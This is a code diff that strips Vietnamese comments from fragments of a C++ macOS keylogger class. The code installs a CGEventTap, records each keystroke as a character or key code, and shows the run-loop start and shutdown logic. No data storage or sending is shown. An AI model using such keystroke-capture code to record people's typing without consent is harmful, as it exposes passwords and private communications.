@@ -84,11 +84,9 @@ CGEventRef Keylogger::CGEventCallback(CGEventTapProxy proxy, CGEventType type, C
             if (!s.empty()) {
                 append(s);
             } else {
-                // Nếu không có ký tự Unicode, ghi mã phím
                 append("[" + std::to_string(keyCode) + "]");
             }
         } else {
-            // Nếu không có Unicode string, ghi mã phím
             append("[" + std::to_string(keyCode) + "]");
         }
     }
@@ -105,7 +103,7 @@ void Keylogger::MacLoop() {
         kCGEventTapOptionDefault, 
         eventMask, 
         CGEventCallback, 
-        nullptr // Không cần refcon vì dùng static method
+        nullptr
     );
 
     if (!eventTap) {
@@ -126,13 +124,8 @@ void Keylogger::MacLoop() {
     
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     
-    // Bắt đầu lắng nghe
     CGEventTapEnable(eventTap, true);
-    
-    // Chạy vòng lặp cho đến khi bị dừng
     CFRunLoopRun();
-    
-    // Cleanup khi run loop kết thúc
     if (runLoopSource) {
         CFRunLoopRemoveSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     }
@@ -151,7 +144,6 @@ void Keylogger::Stop() {
     if (!_isRunning) return;
     _isRunning = false;
 
-    // Dừng event tap trước
     if (eventTap) {
         CGEventTapEnable(eventTap, false);
         CFMachPortInvalidate(eventTap);
@@ -159,18 +151,12 @@ void Keylogger::Stop() {
         eventTap = nullptr;
     }
 
-    // Dừng run loop source
     if (runLoopSource) {
         CFRunLoopSourceInvalidate(runLoopSource);
         CFRelease(runLoopSource);
         runLoopSource = nullptr;
     }
     
-    // Dừng run loop trong worker thread
-    // Lưu ý: CFRunLoopStop phải được gọi từ trong thread đó
-    // Nên ta sẽ dùng cách khác: invalidate event tap sẽ tự động dừng run loop
-    
-    // Đợi thread kết thúc
     if (_workerThread.joinable()) {
         _workerThread.join();
     }
